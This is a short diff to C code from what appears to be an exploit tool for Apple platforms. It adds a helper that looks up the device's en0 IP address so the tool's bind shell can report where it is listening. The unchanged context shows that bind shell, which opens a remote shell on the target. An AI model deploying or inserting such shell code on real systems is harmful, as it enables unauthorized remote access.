@@ -22,6 +22,7 @@
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <arpa/inet.h>
+#include <ifaddrs.h>
 
 #include <CoreFoundation/CoreFoundation.h>
 
@@ -109,6 +110,23 @@ char* prepare_payload() {
   return path;
 }
 
+void get_ip(char buf[16]) {
+  struct ifaddrs *interfaces;
+  int err = getifaddrs(&interfaces);
+  assert(err == 0);
+  struct ifaddrs *iface = interfaces;
+  while (iface != NULL) {
+    if (iface->ifa_addr->sa_family == AF_INET &&
+        strcmp(iface->ifa_name, "en0") == 0) {
+      struct in_addr addr = ((struct sockaddr_in *) iface->ifa_addr)->sin_addr;
+      strlcpy(buf, inet_ntoa(addr), 15);
+      break;
+    }
+    iface = iface->ifa_next;
+  }
+  freeifaddrs(interfaces);
+}
+
 void do_bind_shell(char* env, int port) {
   char* bundle_root = bundle_path();
   
@@ -127,9 +145,11 @@ void do_bind_shell(char* env, int port) {
   int sock = socket(PF_INET, SOCK_STREAM, 0);
   bind(sock, (struct sockaddr*)&sa, sizeof(sa));
   listen(sock, 1);
-  
-  printf("shell listening on port %d\n", port);
-  
+
+  char ip_addr[16] = { 0 };
+  get_ip(ip_addr);
+  printf("shell listening on ip %s port %d\n", ip_addr, port);
+
   for(;;) {
     int conn = accept(sock, 0, 0);
     
